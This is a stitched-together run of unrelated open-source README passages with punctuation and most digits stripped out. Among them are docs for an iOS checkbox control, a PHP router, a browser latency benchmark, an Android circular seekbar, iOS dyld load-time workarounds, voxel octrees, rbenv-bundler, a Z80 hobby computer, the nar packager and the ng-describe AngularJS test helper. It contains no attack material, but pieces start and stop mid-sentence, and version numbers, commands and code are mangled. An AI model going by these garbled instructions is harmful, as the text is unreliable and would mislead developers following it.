from point of touch if this is set to no the tap circle will always ripple from the center of the button default is no a uicolor to use for the checkmark color note that self tintcolor will be used for the square box color the uicolor to use for the circle which appears where you tap to check the box default value is smartly calculated from the checkmarkcolor property set to nil to access default alpha values less than  are recommended the uicolor to use for the circle which appears where you tap to uncheck the box default value is smartly calculated from the tintcolor property set to nil to access default alpha values less than  are recommended the cgfloat value representing the corner radius of the control default value is bfpapercheckboxdefaultdiameter and  note that negative values will be converted to  no funny business a cgfloat representing the diameter of the tap circle as soon as it spawns before it grows default is  f note that negative values and values less than

negative values will be converted to the default no funny business the cgfloat value representing how much we should increase the diameter of the tap circle by when we burst it default is  because we can t see a burst with the default tapcirclediameter which takes up the entire frame if you want to see a burst make the tapcirclediameter something smaller than the diameter of the control itself note that negative values will be converted to the default no funny business a delegate to use our protocol with the functions it conforms to are detailed below an optional protocol method for

can be invoked from the command line e g to run cron jobs simply run php public and index php q foo notice how you can access the page at and foo by simply creating a controller named foo the application maps urls to controllers actions and arguments consider this url and foo and bar in this case foo becomes the name of the controller and view and bar the name of the action actions are public methods on the controller class you can specify a different view for an action using this view setname the view name is a filename relative to the src namespace views directory without the php suffix if the controller or action is not specified they default to index and will call index on helloworld controller index underscores in the controller name are translated to directory separators so and foobar will point to src and helloworld and controllers and foo and bar php dashes in routes are ignored and foo bar and baz qux calls bazqux on helloworld controllers foobar custom routes automatic routing is convenient but more granular control is often desirable in these cases custom routes can be defined a route maps a url to an action method url segments can be replaced with a wildcard placeholder a variable name prefixed with a colon this value becomes available for use in the controller consider this route bar and qux navigating to controller and bar and something matches this route the value of args qux becomes something namespace helloworld controllers use swiftlet abstracts controller as controllerabstract class foo extends controllerabstract protected routes array

9706828, thanks to jmaher the benchmark now accepts command line arguments that enable fully automated benchmark runs with results reported in json format to a server of your choosing the web latency benchmark works by programmatically sending input events to a browser window and using screenshot apis to detect when the browser has finished drawing its response there are two main components the latency benchmark server written in c and c and and and the html and javascript benchmark page the html page draws a special pattern of pixels to the screen using webgl or canvas d then makes an xmlhttprequest to the server to start the latency measurement the server locates the browser window by searching a screenshot for the special pattern once the browser window is located the server starts sending input events each time the html page receives an input event it encodes that information into pixels in the on screen pattern drawn using the canvas element meanwhile the server is taking screenshots every few milliseconds by decoding the pixel pattern the server can determine to within a few milliseconds how long it takes the browser to respond to each input event the native reference test is special because it requires extra support from the server using the native apis of each platform the server creates a special benchmark window that draws the same pattern as the test webpage and responds to keyboard input in the same way to ensure fairness when compared with the browser this window is opened in a separate process and uses opengl to draw the pattern on the screen the benchmark window opens as a popup window only  pixel tall and without a border or title bar so it s almost unnoticeable the web latency benchmark is licensed under the apache license version   this is an open source project it is not an official google product python  x is required on all platforms for gyp which generates the build files windows gyp is currently configured to generate project files for visual studio  express works  might work too if you edit generate project files bat to change the version the windows  sdk is required due to the use of dxgi   it can be installed on windows  and windows vista mac xcode  is required linux clang is required the benchmark does not compile with gcc other build dependencies are development headers for opengl x and udev for the oculus sdk the corresponding debian and ubuntu packages are libgl mesa dev xorg dev and libudev dev first you need to git submodule init git submodule update to fetch the submodules in thirdparty then you need to run generate project files  which will run gyp and generate platform specific project files in build and windows open build and latency benchmark sln linux run the script linux build to compile with clang the binary will be built at build and out and debug and latency benchmark run it in the top level directory so it can find the html files you can build the release version by defining the environment variable buildtype release you shouldn t make any changes to the xcode or visual studio project files directly instead you should edit latency benchmark gyp to reflect the changes you want and re run the generate project files script to update the project files with the changes this ensures that the project files stay in sync across platforms bookmarklet or browser extension for injecting a hardware latency test into any web page support for more operating systems android ios chrome os support jank measurement with the oculus latency tester in addition to latency measurement fix non firefox browsers in automated testing mode on windows mousewheel scroll events not sent properly fix ie in high dpi mode test pattern scrolls off screen disable mouse and keyboard input during the test to avoid interference hide the mouse cursor during the test find a way to share constants like the test timeout between js and c test more possible causes of jank audio and video loading plugins javascript parsing webgl shader compilation web worker javascript parsing and execution gc in a worker html parsing css parsing layout dns resolution window resizing image resizing xhr starting and ending all of the above in an iframe or popup

ellipses in addition it is fully customizable via xml attributes far beyond the default values h support and testing and h tested and working on android   and tested on the following devices htc one google edition android   htc one x at t android   galaxy nexus android   emulator with android versions     circularseekbar has also been tested with normal scrolling it was also been tested successfully with fragments as well as scrolling tabs and fragments known issues the glow effect around the progress part of the circle will not show up on android   and this is due to the blurmaskfilter not working when hardware acceleration is on android os issue h documentation and h in order to use the circularseekbar you need to do three things h  add source files to project and h there are two files you need to include circularseekbar java attrs xml place the attrs xml file inside of your res and values directory and yourprojectdir and res and values and attrs xml place circularseekbar java inside of the src folder with the entire directory structure included and yourprojectdir and src and com and devadvance and circularseekbar and circularseekbar java h  customize source files and h to use any methods inside if your classes you must import the correct file add this to any classes you want to programmatically use the circularseekbar in import com devadvance circularseekbar circularseekbar you also need to add the import for the generated r class to the circularseekbar class you need to change the top of the circularseekbar java file to look like this package com devadvance circularseekbar import com example yourappname r where b com example yourappname and b depends on your project and app eclipse may offer to add this import for you h  add circularseekbar to your layout and h start by adding this to the root of your layout xml file s after you add it the root of your layout xml file s should look similar to this android layoutwidth matchparent android layoutheight matchparent to add the basic circularseekbar to your layout add this to your layout xml file s where desired com devadvance circularseekbar circularseekbar android id and id and circularseekbar android layoutwidth wrapcontent for further configuration such as color sizes and angle you can specify many attributes associated with the circularseekbar such as app startangle  app endangle  app circlexradius  app circleyradius  app usecustomradii true app progress  app max  app pointeralphaontouch  app pointercolor df app pointerhalocolor df b note all sizes are measured in degrees or dp no pixels are used and b you can also change the standard android view attributes such as android layoutwidth dp android layoutheight dp android layoutmargintop dp android padding dp to use the circularseekbar programmatically you can treat it like a normal seekbar inside of your code circularseekbar seekbar circularseekbar findviewbyid r id circularseekbar seekbar getprogress seekbar setprogress  to use the listener to detect progress changes first add the import for the class at the top of your file import com devadvance circularseekbar circularseekbar

43435794, put your party hat on the image loading time is  faster on ios   beta   here is an example app launch comparison profiled on an ipad air  and and ios   total time   seconds   total images loading time   seconds   and and ios   beta  total time   seconds   total images loading time   seconds   important note the performance improvement is in system libraries your binary dynamically links against users on ios   won t see any difference even if your app is compiled with the xcode   toolchain i still recommend using one of the workarounds described below until your project s deployment target can be ios   or higher the cost has been significantly reduced but it s not free so make sure you profile your launch time if you have a non trivial app tl dr  dyld takes too long to load frameworks which makes apps slow to open since ios  it is possible to ship dynamic libraries inside the app bundle to app store it is the way to ship swift dependencies and to share your swift code with extensions  you cannot use static libraries with swift plus frameworks allow you to share symbols instead of shipping them multiple times and inflating your bundle size there is a major performance issue when using frameworks  the image loading and linking time that dyld takes during first app launch is so long that a mid sized app i e an app with a couple of dozen dependencies takes several seconds to open on older devices the app will often get killed by watchdog before managing to launch at all the linking time was bad on ios  and the performance is notably worse on ios  typically you add frameworks to your app through link binary with libraries step in xcode which results in a framework flag passed to ld during build and consequently in a lcloaddylib command in the final executable however dyld commands get executed before lldb or dtrace get attached so it s hard to track down what s happening this example app doesn t link against the frameworks but instead invokes dlopen manually during runtime still consistently reproducing the issue it uses a set of frameworks as built by useframeworks through cocoapods presumably carthage and manual dependencies through e g git submodules run into the same issue note nsdate is a na ve way to measure performance but it s good enough here since the operation is in the order of seconds here  another note included frameworks only contain arm and armv slices make sure you run the app on a physical device with one of these architectures we want to be using dyld that ships with ios anyway ios simulator can possibly be using a different one  this is a sample measure dlopen takes when running the example on ipad air   on an ipad  the same operation takes  seconds start       and  end       and  when using instruments only a fraction of the time taken is reported in time profiler you can see below that only ms is attributed to dyld while the thread was clearly blocked on dlopen for  seconds siginfo fsfilestart offsetinfatfile and and start of mach o slice in fat file siginfo fsblobstart void long codesigcmd dataoff and and start of cd in mach o file siginfo fsblobsize codesigcmd datasize and and size of cd int result fcntl fd faddfilesigs siginfo  get rid of linker framework flags and promise to provide filelist instead  if you re using cocoapods it can be automated through a postinstall step in podfile ruby postinstall do and installer and podstarget installer aggregatetargets detect do and target and target label is either pods or pods nameofyourmaintarget based on how complex your dependency graph is target label pods puts and removing framework dependencies podstarget xcconfigs eachpair do and configname config and next if configname test config otherlinkerflags frameworks set new config attributes otherldflags arch armv inherited filelist objroot and pods build and configuration effectiveplatformname armv objects filelist config attributes otherldflags arch arm inherited filelist objroot and pods build and configuration effectiveplatformname arm objects filelist config attributes otherldflags arch i inherited filelist objroot and pods build and configuration effectiveplatformname i objects filelist config attributes otherldflags arch x inherited filelist objroot and pods build and configuration effectiveplatformname x objects filelist config saveas pathname new podstarget supportfilesdir and podstarget label configname xcconfig notice that we don t remove frameworks if configname test xctest bundles seem to have issues running properly let me know if you succeed in running tests with this setup  create a filelist per architecture containing object files to be linked into the final executable  again if you re using cocoapods automate it by the following script run it after manifest lock is verified in your main target it needs to happen after all dependencies are compiled but before the main executable is linked ruby intermediatesdirectory env objroot configuration env configuration platform env effectiveplatformname archs env archs archs split each do and architecture and dir chdir intermediatesdirectory and pods build do filelist dir glob configuration platform and build and objects normal and architecture and o do and objectfile and filelist and file absolutepath objectfile and n file write configuration platform architecture objects filelist  filelist  link your app executable against any static libraries needed  you might or might not get linker errors if you don t so make sure you test the hell out of your app  resource bundles don t exist include all resources into your main bundle  also edit your code in case it expects resource bundles to exist  if using cocoapods completely skip the embed pod frameworks step for configurations that use this workaround e g not for tests if configuration test then srcroot and pods and target support files and pods yourtarget and pods yourtarget frameworks sh link against all frameworks using weakframework and invoke dlopen during the run of the app the example app does this you ll need to ensure the framework is loaded before using any symbols from it you will still take the dyld performance hit but this gives you flexibility when the hit happens

5745754, directives in angularjs encapsulate all of the custom dom manipulation that happens in an angularjs application this makes them very crucial part of a bigger angular app dom manipulation is often source of problems especially when it comes to browser inconsistencies this is why it is important to cover the directive code with automated tests unfortunately many developers consider any kind of dom manipulation to be too hard to test so this code more often than not lives a sad life of untested code full of creepy bugs the goal of this example is to show how to test directives easily and become confident that the directive code works and works on all targeted browsers let s take the tabs component from angular homepage it would be difficult to test the visual representation of the component but there are many functional aspects of this component that are worthy testing for instance does it render correct structure e g navigation and content for each pane does the binding inside the content work does clicking the particular tab link cause changing of the active pane is the first tab selected by default executing these tests is easy we just ask for compile and compile given dom structure then we can use jquery to assert whether the component works as expected note that we don t append the dom structure to the document that makes the tests faster because browser does not have to render it so unless it s necessary eg you need to know some computed property of some dom element  don t attach nodes to the document the spectrum of tests is not discrete there are not just unit tests or ee tests the previous tests are probably not unit tests these are little bit higher level tests it s always good to try to cover stuff with as low as possible test yep in this case it s just duplicating we already covered this functionality in the higher level tests above but now once we have this little framework for testing the controller separately we can easily add more tests for instance if we found a bug in the controller we would add a lightweight unit test just for the controller instead of the entire directive this was nice but how about external templates inlining html templates as strings is kind of nasty eg you don t get syntax highlighting and linting in ide  so we want to put the templates into external html files how do you test that you want to test these html files as well otherwise it makes no sense well with karma this is pretty easy you can use htmljs preprocessors for that now whenever you change any of the html files karma immediately generates the js file that puts the html into templatecache npm install g karma karma start

11560956, sparse voxel octrees  this project provides a multithreaded cpu sparse voxel octree implementation in c and and  capable of raytracing large datasets in real time converting raw voxel files to octrees and converting mesh data in form of ply files to voxel octrees the conversion routines are capable of handling datasets much larger than the working memory allowing the creation and rendering of very large octrees resolution xx and up compilation  a recent compiler cupporting c and and  cmake   and sdl   are required to build to build on linux you can use the setupbuilds sh shell script to setup build and release configurations using cmake after running setupbuilds sh  run make inside the newly created build and release and folder alternatively you can use the standard cmake cli to configure the project to build on windows you will need visual studio  or later before running cmake make sure that cmake is on the path environment variable an easy check to verify that this is the case is to open cmd and type cmake  which should output the cmake cli help the environment variable sdldir exists and is set to the path to the folder containing sdl  you will have to set it up manually it needs to be a system environment variable not a user variable for cmake to find it cmake will use this variable to find the sdl relevant files and configure msvc to use them after these prerequisites are setup you can run setupbuilds bat to create the visual studio files it will create a folder vstudio containing the sparse voxel octrees sln solution alternatively you can also run cmake manually or setup the msvc project yourself without cmake the sources don t require special build flags so the latter is easily doable if you can t get cmake to work to build on macos you will need to install sdl first i e brew install sdl then build it like a regular cmake project mkdir build cd build cmake and and sparse voxel octrees viewer and models and xyzrgb dragon oct on macos you may need to click and drag within the application window first to make the render visible note if building fails on macos you can try commenting out the follow lines in code cmakelists txt and code if cmakesystemname matches darwin set sources sources src and sdlmain m endif on startup the program will load the sample octree and render it left mouse rotates the model right mouse zooms escape quits the program in order to make cli arguments easier on windows you can use code runviewer bat and code to start the viewer code main cpp and code controls application setup thread spawning and basic rendering should move this into a different file instead at some point code voxeloctree cpp and code provides routines for octree raymarching as well as generating saving and loading octrees it uses code voxeldata cpp and code  which robustly handles fast access to non square non power of two voxel data not completely loaded in memory the code voxeldata and code class can also pull voxel data directly from code plyloader cpp and code  generating data from triangle meshes on demand instead of from file which vastly improves conversion performance due to elimination of file i and o

2411723, this plugin transparently makes rbenv s shims aware of bundle installation paths it saves you from the hassle of having to type bundle exec when working with per project gemsets and will enable rbenv which to report bundler installed gem executables if available documentation thoroughly and be sure to set up your bash environment correctly  install the plugin and rbenv and plugins and bundler alternatively through homebrew brew install rbenv bundler  make sure that there is a    and system or rbenv ruby with the bundler gem installed available for the plugin s use ruby r bundler e puts rubyversion     important the plugin is opt in if you wish to enable it type rbenv bundler on type rbenv bundler off to disable  just as you would run rbenv rehash upon installation of a new ruby distribution or a gem with associated executable you will also need to run it inside bundler controlled project directories with local rbenv installed ruby versions set suppose the project uses ruby version    rbenv local    install the version specific bundler gem gem install bundler suppose you already have a gemfile bundle install the plugin will automagically rehash for you on bundle install or bundle update  so this step isn t necessary rbenv rehash if rake is a bundler installed gem executable report its location with rbenv which the result should look like rbenvroot and versions and    and lib and ruby and gems and    and gems and rake    and bin and rake instead of rbenvroot and versions and    and bin and rake rbenv which rake run rake without having to type bundle exec rake rake    jul   fix an issue with platform gems not being found in the gemfile lock   nov   fix the bundler monkey patch for bundler version   and later   oct   compute md hashes in a cross platform way to support mac os x linux and various bsds   aug   improve plugin root directory detection to take into account homebrew s symlink usage change the plugin s on and off behavior to be opt in instead of opt out additionally it keeps track of on and off state per rbenv installation not as if the vast majority of users would need this kind of isolation bundler would behave differently when a given gem s internal bin directory as opposed to the rbenv ruby s bin directory is prepended onto the path environment variable this caused shims for gems like unicorn to fail mysteriously   feb   recognize rubinius as a valid ruby engine spoof rubygems platform information to handle the case when the ruby parsing the gemfile has a platform different from the project ruby   may   automagically rehash after bundle install and bundle update this is achieved by intercepting either command and using an internally provided script that rehashes afterwards optimize rehash times by not running the rehash rb script if discovered gemfiles haven t changed this is achieved by comparing the modification times of gemfile manifests against their gemfiles slow shell initialization should now be a thing of the past   jan   fix rbenv version detection to look for ruby version files in addition to rbenv version files set up the path environment variable correctly when building rbenv ruby profiles make rbenv ruby profile discovery more robust   jul   relicense the project to the apache license version   change the rehash rb script so that it detects the bundlegemfile environment variable and looks for a bundler controlled project there the rbenvbundler ensurecapableruby method would claim jruby   x as capable when it s not lack of kernel fork addresses the corner cases when either the manifest txt file doesn t exist or the rubyprofiles yml file is first created   may   a crash would result from rbenv ruby profiles not being updated to reflect the removal of a ruby the rehash rb script now checks the recency of the and rbenv and versions directory instead of rbenv ruby directories to determine if rubies have been added or removed the rehash rb script would attempt to parse empty child process output when building rbenv ruby profiles such situations are now detected and skipped mask the return value of the rehash rb script change the rehash hook so that it doesn t cause the shell to exit prematurely from e being in effect   apr   ensure that a capable ruby runs the rehash rb script change the rehash rb script so that if it detects an inappropriate ruby version it will attempt to locate and kernel exec an appropriate one build rbenv ruby profiles to induce correct bundler search behavior with knowledge of each ruby gems implementation s version information and directory structure the rehash rb script can configure bundler to exhibit the correct search behavior in all cases git based dependencies would not resolve correctly with the rehash rb script when using a git repository as a dependency bundler loads its gemspec file which in turn may modify the ruby state arbitrarily in ways that aren t readily reversible to sidestep such behavior the plugin now forks a child process for making sensitive bundler calls setups without path specified would sometimes pick gem executables with incorrect versions as a result of reconciling different use cases the plugin has been rearchitected to use a helper script rehash rb  to explore bundler controlled directories and create a gemspec manifest for each project that way a gem executable satisfying gemfile version constraints can be picked every time   jan   the plugin now scans and bundle and config in addition to and as a fallback for the project local bundler configuration file credit mbrictson nonexistent directories would cause the rehash mechanism to return   sep   update plugin scripts to use the rbenvdir environment variable start release tagging copyright   roy liu licensed under the apache

52200867, fap is a z based retro computer with a sprinkling of modern twists to make the experience of designing programming and debugging this computer as painless and straightforward as possible a lot of retro computer projects today are rooted on nostalgia they tend to use  period correct components to get the  feelings right and the result often ends up on perfboard or self etched circuit boards rudimentary video capacity if at all few i and o ports and a sea of  series chips while there is nothing wrong with that i wasn t around during the s home computer era so i didn t have the same attachment to how things was done back then so instead of trying to recreate the  good old days  i made the decision to liberally use modern parts to simplify the design process employing configurable logics such as fpga cpld and microcontrollers making this computer highly flexible and easy to program with very little overheads the project started life hand assembled but now lives properly on pcbs because of noise problems mhz cmos z  slot active backplane usb powered kb rom kb ram kb double buffered vram  color x vga graphics ps and  keyboard esp sd card ic eeprom rtc uart timers  v bus allows modern peripherals all z signals on bus managed by stm microcontroller z clock from pwm channel speed variable from single step to mhz breakpoints and traces read and write into eeprom and ram directly interrupt chaining supported bus address and data display on lcd pushbutton for z reset single step run and stop etc all signals buffered and shifted to  v kb rom kb ram buffered output rom write protected during normal execution fpga based  colors x vga output x codepage  text mode kb double buffered vram or kb unbuffered bitmap or sprite mode can be implemented easily cpld based stm io and interrupt controller all interrupt modes supported  ports  uarts ic eeprom sd card ps and  keyboard as i said above i made the decision to use modern parts for simplicity and flexibility in the design take the active backplane for example the entire bus is connected to a stm microcontroller which drives z clock via one of its pwm channels at the same time the uc monitors the contents on the bus so setting breakpoints or obtaining execution traces can be easily done the uc can also reset the z or even take over the bus and read and write directly into eeprom and ram notice how a cheap modern part eliminates the need for separate reset circuitry clock circuitry debugger and eeprom programmer and because the uc is programmable it can be customized even after hardware design is done similarly a fpga replaces the vdc a cpld replaces  dozens of  chips and another stm is used as i and o and interrupt controller this gives an enormous amount of flexibility to suit individual needs text mode graphics too limited write your own sprite and bitmap mode want more i and o ports or a different interrupt mode just modify the cpld code the ability to be able to continue expand and evolve the capability of the computer without having to change the hardware becomes an exciting aspect as a result i also intended this project as a study in embedded development as it involves a little bit of everything microcontrollers fpgas cplds digital circuits pcb design and fabrication surface mount soldering setting up cross assembling and compiling environment assembly programming and a lot others that i couldn t think of at the moment yes it s harder to put together than a through hole kit but it was all part of the challenge current hardware design firmware for all uc and fpga and cpld python script for program upload cross assembler setup sdcc setup simple print functionalities in c and assembly write an irc client for fap finish up project documentation a new memory board with mb flash memory for both rom and ram and a cpld controller for configurable memory decoding and paging a new vga video card with on board fpga instead of using mojo v with larger vram and more interrupt options see doc folder and doc fap stands for fpga assisted processor inspired by steve ciarcia s  book build your own z computer  in which he called his computer zap short for z application processor

inspect the archive contents example using tar tar xvfz app    nar note this is not applied for nar executables since they have another format and not just a tarball file interface no from version    you can create executable binary like applications containers and there is no more required to have previously installed node or nar in order to run install or extract an application you can create an executable archive simply passing a flag nar create executable then you could run it like a binary and app    linux x nar run and extract and install options if you don t create your archive with this option you must to have nar and consequently node installed in the target computer no nar executables only can run in posix operative systems gnu and linux darwin or sunos is not planned to support it due to technical limitations in windows os v javascript engine which node uses has a heap memory limit of  gb this is teorically the maximum fize limit however it can variadic depend on the number of files and its sizes and also based on your machine memory resources and os if you are running windows when creating running or extracting nar archives however nar was tested in real projects creating archives which contains thousands of files and which the generated archive has more than  mb of file size the node binary that is begin used when the nar archive is created to be exactly the binary that that means if you create an executable archive in osx and then deploy it into a gnu and linux server it will fail if you want to create a nar archive for different os you must create a nar executable executables passing the target os and optionally the processor architecture or node js version like this nar create executable os linux arch x node    when you use the run command if the archive you are running has a node binary embedded and therefore it was created with the binary option set true  your application will use it transparently one of the following types will be valid application and x gzip application and x compress application and x compressed application and octet stream of course you could use both methods passing credentials via optional flags or using the httpuser and httppassword environment variables wanna help cool it will be really apreciated nar is completely written in livescript language take a look to the language documentation livescript if you are new with it and follow the livescript language conventions defined in the coding style guide coding style you must add new test cases for any new feature or refactor you do always following

finally a test  function expect foo toequal bar  ng describe can inject dependencies mock modules set configs create controllers scopes and even html fragments for more details continue reading we also showed this library at angularjs nyc npm install ng describe save dev load ng describe js after angular and angular mocks but before your specs for example in karma conf file and and karma conf

describe js includes es shim and other dependencies needed by the ngdescribe function ng describe provides a single function ngdescribe that takes an options object ngdescribe and and your options you do not have to specify every option there are reasonable defaults we also tried to make ngdescribe returns itself so you can chain multiple sets of specs easily ngdescribe name first suite name second suite name a string name for the spec similar to bdd describe name modules list of modules to inject angular module a  angular module b  ngdescribe name modules example  modules a  b if you have a single module to inject you can just use a string name without array notation ngdescribe name single module  modules a inject list of dependencies to inject into unit tests a single dependency can be just a string without array notation all dependencies will be exposed as properties of the deps argument to the tests callback angular module a  value foo   ngdescribe name inject example  modules a  inject foo  timeout  tests function deps it has foo  function expect deps foo toequal  it has timeout service  function expect typeof deps timeout toequal function tests callback function that contains actual specs think of this as equivalent to describe with all necessary angular dependencies taken care of ngdescribe inject q  rootscope  tests function deps it injects q  function expect typeof deps q toequal function it can be resolved  function deps q when  then function value expect value toequal   and and move promises along deps rootscope digest dependencies injection shortcut you can list the dependencies to be injected directly in the test callback angular module shortcut  constant foo  bar ngdescribe module shortcut  tests function foo it has constant  function console assert foo bar you can inject multiple providers including built in services if the test callback argument is named deps or dependencies it will be assumed that you do not use the shortcut the shortcut was implemented using changing named parameters trick trick mocks top level mocks to be substituted into the tests the mocks override any injected dependencies among modules ngdescribe mocks and and each module to mock by name modulename and and each dependency from modulename to mock dependencyname mockvalue dependencyname mockvalue and and the rest of modulename is unchanged modulename and and dependencies to mock in modulename for more information see examples below controllers list of controllers by name that should be injected each controller is created with a new rootscope instance note for each created controller its scope instance will be in the dependencies object angular module d  controller dcontroller  function scope scope foo foo ngdescribe modules d  controllers

dcontroller foo toequal foo element html fragment string for testing custom directives and dom updates ngdescribe element my foo bar baz and my foo the compiled angular element will be injected into the dependencies object under element property see examples below for more information the compilation will create a new scope object too parentscope when creating html fragment copies properties from this object into the scope the returned dependencies object will have deps parentscope that is the new scope and and myfoo directive uses isolate scope for example ngdescribe element my foo bar baz

this set of tests and skip the rest equivalent to ngdescribe name run this module only  only true skip flag to skip this group of specs equivalent to xdescribe or describe skip could be a string message explaining the reason for skipping the spec exposeapi expose low level ngdescribe methods the tests callback will get the second argument which is an object with the following methods setupelement function elementhtml  setupcontrollers function controllernames you can use setupelement to control when to create the element for example instead of creating element right away expose element factory so that you can create an element after running a beforeeach block useful for setting up mock backend before creating an element ngdescribe exposeapi true inject httpbackend  and and no element option tests function deps describeapi beforeeach function deps httpbackend expectget and api and foo and bar respond  beforeeach function and and now create an element ourselves it created an element  function la check has deps element see the spec in test and expose spec js test and expose spec js or you can use setupcontrollers to create controller objects after setting up your spies angular module broadcastcontroller  controller broadcastcontroller  function broadcastcontroller rootscope rootscope broadcast foo we need to listen for the foo broadcast inside a unit test before creating the controller if we let ngdescribe create the broadcastcontroller it will be too late instead we can tell the ngdescribe to expose the low level api and then we create the controllers when we are ready ngdescribe name spy on controller init  modules broadcastcontroller  inject rootscope  exposeapi true tests function deps describeapi it can catch the broadcast in controller init  function done var heardfoo deps rootscope on foo  function heardfoo true done  describeapi setupcontrollers broadcastcontroller see the spec in test and controller init spec js test and controller init spec js http shortcut for specifying mock http responses each get request will be mapped to httpbackend whenget for example you can provide data response code and data pair response code and data and headers and optionally statustext or custom function to return something using custom logic if you use http property then the injected dependencies will have http object that you can flush it is really httpbackend object ngdescribe inject http  and and for making test calls http get and my and url  and and status  data  and my and other and url    and and status  data  and my and smart and url function method url data headers return  something is wrong and and status  data something is wrong post and my and url and my and url  message ok  location and new and url  this is the new response  and and status data headers and statustext and and same format as get tests function deps it responds  function done deps http get and my and other and url then function response and and expect and and response status  and and response data  done  deps http flush all standard methods should be supported get  head  post  put  delete  jsonp and patch each of the methods can return a function that returns an configuration object see mock http mock http step shortcut for running the digest cycle and mock http flush tests function deps it runs the digest cycle  function done q when  finally done deps step and and same as deps rootscope digest also flushes the mock http backend tests function deps it returns expected result  function done deps http get then finally done deps step and and same as deps http flush also flushed the timeout service ngdescribe inject timeout  tests function deps it function deps timeout deps step and and same as deps timeout flush root alternative context for bdd callbacks imagine we are loading angular and ngdescribe in a synthetic browser environment like object but the test framework callbacks are attached to global object not window by passing an alternative object we allow ngdescribe to discover it  beforeeach  etc and and load ngdescribe in jsdom under node window ngdescribe root global tests function deps example that tests angular without a browser only a synthetic emulation most examples use use the la assertion from the also note that the dependencies object is filled only inside the unit test callbacks it and setup helpers beforeeach and aftereach ngdescribe inject foo  tests function deps and and deps is an empty object here beforeeach function and and deps object has foo and and deps is an empty object here it function and and deps object has foo and and deps is an empty object here aftereach function and and deps object has foo angular module a  value foo  bar and and a spec js ngdescribe name test value  modules a  inject foo  tests function deps and and deps object has every injected dependency as a property it has correct value foo  function la deps foo bar we can easily test a built in or custom filter function ngdescribe name built in filter  inject filter  tests function deps it can convert to lowercase  function var lowercase deps filter lowercase la lowercase foo foo we can inject a service to test using the same approach you can even use multiple specs inside tests callback angular module b  a service addfoo  function foo return function str return str and foo and and b spec js ngdescribe name service tests  modules b  inject addfoo  tests function deps it is a function  function la typeof deps addfoo function it appends value of foo to any string  function var result deps addfoo x la result xbar we can easily create instances of controller functions and scope objects in this example we also inject timeout service to speed up delayed actions angular module s  controller sample  function timeout scope scope foo foo scope update function timeout function scope foo bar   ngdescribe name timeout in controller  modules s  and and inject timeout so we can flush the timeout queue inject timeout  controllers sample  tests function deps and and deps sample scope object injected into sample controller it has initial values  function la deps sample foo foo it updates after timeout  function deps sample update deps timeout flush la deps sample foo bar angular module myfoo  directive myfoo  function return restrict e  replace true template span bar and span ngdescribe name myfoo directive  modules myfoo  element my foo and my foo  tests function deps it can update dom using binding  function la check has deps element  has compiled element var scope deps element scope scope bar bar scope apply la deps element html bar if you use controlleras syntax without any components see binding to binding post or separate separate  then you can still test it quickly angular module h  controller hcontroller  function and and notice we attach properties to the instance not to the scope this foo foo ngdescribe module h  tests function deps it created controller correctly  function var compiledhtml deps element html and and foo  it changes value  function var ctrl deps element controller and and foo foo ctrl foo bar deps element scope apply var compiledhtml deps element html and and bar  if you add methods to the controller inside custom directive use controlleras syntax to expose the controller instance angular module c  directive cdirective  function return controlleras ctrl  and and puts controller instance onto scope as ctrl controller function scope scope foo foo this foo function getfoo return scope foo  ngdescribe name controller for directive instance  modules c  element c directive and c directive  tests function deps it has controller  function var scope deps element scope and and grabs scope var controller scope ctrl and and grabs controller instance la typeof controller foo function la controller foo foo scope foo bar la controller foo bar if a directive implements isolate scope we can configure parent scope separately angular module isolatefoo  directive afoo  function return restrict e  replace true scope bar template span bar and span we can use element together with parentscope property to set initial values ngdescribe modules isolatefoo  parentscope x initial tests function deps it has correct initial value  function var scope deps element isolatescope expect scope bar toequal initial we can change parent s values to observe propagation into the directive and and same setup it updates isolate scope  function deps parentscope x  deps rootscope apply var scope deps element isolatescope expect scope bar toequal  you can use multiple beforeeach and aftereach inside tests function ngdescribe name before and after example  modules a  inject foo  tests function deps var localfoo beforeeach function and and dependencies are already injected la deps foo bar localfoo deps foo it has correct value foo  function la localfoo bar aftereach function la localfoo bar and and dependencies are still available la deps foo bar this could be useful for setting up additional mocks like httpbackend angular module apicaller  service getit  function http return function return http get and my and url ngdescribe name http mock backend example  modules apicaller  inject getit  httpbackend  tests function deps beforeeach function deps httpbackend expectget and my and url respond   it returns result from server  function done deps getit then function response la response response status  la response data  done  deps httpbackend flush aftereach function deps httpbackend verifynooutstandingrequest deps httpbackend verifynooutstandingexpectation note if you use beforeeach block with element  the beforeeach runs before the element is created this gives you a chance to setup mocks before running the element and possibly making calls if you really want to control when an element is created use exposeapi option see secondary options secondary options often during testing we need to mock something provided by a module even if it is passed via dependency injection ng describe makes it very simple list all modules with values to be mocked in mocks object property angular module c  a service getfoo  function foo and and foo is provided by module a return function getfoo return foo and and c spec js ngdescribe name test c with mocking top level  modules c  inject getfoo  mocks and and replace c getfoo with mock function that returns  getfoo function return  verbose false tests function deps it has mock injected value  function var result deps getfoo la result  we got back mock value  result remember when making mocks it is always module name provider name mocked property name module name mocked provider name mocked value name note the mocked values are injected using provider constant call to be able to override both values and constants angular module a  constant foo  bar ngdescribe modules a  mock a foo  inject foo  tests function deps it has correct constant foo  function expect deps foo toequal  you can even mock part of the module itself and use mock value in other parts via injection angular module largemodule  constant foo  foo service getfoo  function foo return function getfoo return foo ngdescribe name mocking part of the module itself  modules largemodule  inject getfoo  mock largemodule foo bar tests function deps it service injects mock value  function la deps getfoo bar  returns mock value you can use other injected dependencies inside mocked functions using injected values and free parameters ngdescribe inject getfoo  rootscope  mocks and and use angular q service in the mock function and and argument value remains free getfoo function q value return q when value tests function deps it injected q into mock  function done deps getfoo foo then function result expect result toequal foo done  deps rootscope apply and and resolve promise often we need some dummy response from http get method we can use mock httpbackend or mock the http object for example to always return mock value when making any get request we can use http get function q url and and inspect url if needed return q when data life    http service returns a promise that resolves with a response object the actual result to send is placed into the data property as i show here you can use a shortcut to define mock http responses via httpbackend module for example you can define static responses ngdescribe http get and some and url  and some and other and url  something went wrong post and and you can use custom functions too and some and post and url function method url data headers return  ok all http methods are supported get  post  delete  put  etc you can also get a function that would return a config object var mockgetapi and some and url  mockgetapi and some and other and url  not ok ngdescribe http get mockgetapi you can use deps http flush to move the http responses along you can return the entire http mock object from a function or combine objects with functions function constructmockapi return get function return and my and url  post and my and other and url  nice ngdescribe http constructmockapi test function deps you can use exact query arguments too and foo and bar search value  and foo and bar search value something else foo and and http get and foo and bar search value will resolve with value  and and http get and foo and bar search value something else will resolve with value foo or you can build the query string automatically by passing params property in the request config and foo and bar search value something else foo and and inside the unit test var config params search value  something else http get and foo and bar  config then function response and and response data foo note the http mocks are defined using httpback when method calls which are 